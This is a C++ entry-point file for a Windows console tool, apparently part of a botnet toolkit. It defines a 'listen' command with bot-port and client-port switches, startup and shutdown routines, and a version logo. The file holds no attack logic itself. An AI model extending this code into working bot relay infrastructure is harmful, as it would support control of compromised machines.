#include <windows.h>
#include <shellapi.h>
#include <shlwapi.h>

#include "defines.h"
#include "language.h"
#include "core.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\cui.h"
#include "..\common\crypt.h"
#include "..\common\console.h"

COREDATA coreData;

//Опции для Listen.
static const Cui::SWITCH listenSwitches[] =
{
  {lng_switch_nologo,                lng_switch_nologo_help},
  {lng_switch_ipv4,                  lng_switch_ipv4_help},
  {lng_switch_ipv6,                  lng_switch_ipv6_help},
  {lng_switch_botport    L":[port]", lng_switch_botport_help},
  {lng_switch_clientport L":[port]", lng_switch_clientport_help}
};

//Команды
void commandListen(LPWSTR *switches, DWORD switchesCount);

static const Cui::COMMAND commands[] =
{
  {lng_command_listen, lng_command_listen_help, commandListen, (Cui::SWITCH *)listenSwitches, sizeof(listenSwitches) / sizeof(Cui::SWITCH)}
};

////////////////////////////////////////////////////////////////////////////////////////////////////

void Core::init(void)
{
  Mem::_zero(&coreData, sizeof(COREDATA));
  CWA(kernel32, GetModuleFileNameW)(NULL, coreData.fileName, MAX_PATH);

  coreData.exitCode         = Cui::EXITCODE_ERROR_BAD_COMMAND_LINE;
  coreData.commandLine.args = CWA(kernel32, CommandLineToArgvW)(CWA(kernel32, GetCommandLineW()), &coreData.commandLine.argsCount);
}

void Core::uninit(void)
{
  if(coreData.commandLine.args)CWA(kernel32, LocalFree)(coreData.commandLine.args);
}

void Core::showLogo(void)
{
  Console::writeFormatW(lng_logo, VERSION_MAJOR(BO_CLIENT_VERSION), VERSION_MINOR(BO_CLIENT_VERSION), VERSION_SUBMINOR(BO_CLIENT_VERSION), VERSION_BUILD(BO_CLIENT_VERSION));
}

///////////////////////////////////////////////////////////////////////////////
// Точка входа.
///////////////////////////////////////////////////////////////////////////////

void WINAPI entryPoint(void)
{
  Mem::init();
  Console::init();  
  Crypt::init();
  Core::init();
  
  CUI_DEFAULT_COMMANDLINE_HELPER;

  Core::uninit();
  Crypt::uninit();
  Console::uninit();
  Mem::uninit();
  
  CWA(kernel32, ExitProcess)(coreData.exitCode);
}
